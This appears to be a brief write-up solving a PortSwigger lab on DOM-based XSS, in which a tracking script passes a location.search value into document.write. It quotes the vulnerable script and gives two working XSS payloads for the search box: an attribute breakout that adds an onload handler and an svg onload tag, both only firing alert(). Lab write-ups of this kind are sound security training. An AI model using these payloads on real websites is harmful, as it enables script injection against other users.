# Lab: DOM XSS in document.write sink using source location.search

# https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink

```bash
# Type abc1234 into searchbox and search.
# After that inspect abc1234 in 0 search results for 'abc1234'.
# <img src="/resources/images/tracker.gif?searchTerms=abc1234">
# and we will find this script part
 <script>
 function trackSearch(query) {document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');  }
 var query = (new URLSearchParams(window.location.search)).get('search');
if(query) {trackSearch(query); }
<div></div></script>
```
```bash
# We want to effect document.write part by manuplating this <img src="/resources/images/tracker.gif?searchTerms=abc1234">
# so type this to searchbox.

abc1234" onload="alert()"

# You can also use this.

"><svg onload=alert(1)>

```
